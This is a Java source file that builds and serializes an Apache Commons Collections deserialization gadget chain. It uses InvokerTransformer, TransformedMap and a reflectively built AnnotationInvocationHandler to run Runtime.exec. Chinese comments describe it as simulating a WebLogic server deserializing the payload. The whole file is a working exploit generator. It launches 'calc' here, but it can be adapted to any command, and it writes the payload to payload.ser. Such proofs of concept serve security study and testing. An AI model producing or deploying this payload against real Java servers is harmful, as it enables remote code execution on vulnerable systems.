import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class CommonsCollectionPayload {
    public static void main(String[] args) throws Exception {
        //Runtime.getRuntime().exec("calc");
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] { String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new String[]{"calc"})
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);
        //只需要有一处调用 chainedTransformer
        Map inMap = new HashMap();
        inMap.put("value", "value");
        Map outMap = TransformedMap.decorate(inMap, null, chainedTransformer);
        /*
        AnnotationInvocationHandler这个对象是一个单例类没办法直接new出来，先通过反射得到其Class实例，
        再通过Class实例调用其getDeclareConstructord方法来获取构造器Construct的实例，最后通过调用构造器的newInstance()方法来获取其实例对象
         */
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor ctor = cls.getDeclaredConstructor(new Class[] { Class.class, Map.class });
        ctor.setAccessible(true);
        Object instance = ctor.newInstance(new Object[] { Retention.class, outMap });
        /*
        序列化写入构造好的AnnotationInvocationHandler实例对象
         */
        FileOutputStream fos = new FileOutputStream("payload.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(instance);
        oos.flush();
        oos.close();
        /*
        反序列化来模拟weblogic服务器处理该序列化类文件的场景，从而触发命令执行
         */
        FileInputStream fis = new FileInputStream("payload.ser");
        ObjectInputStream ois = new ObjectInputStream(fis);
        Object newObj = ois.readObject();
        ois.close();
    }
}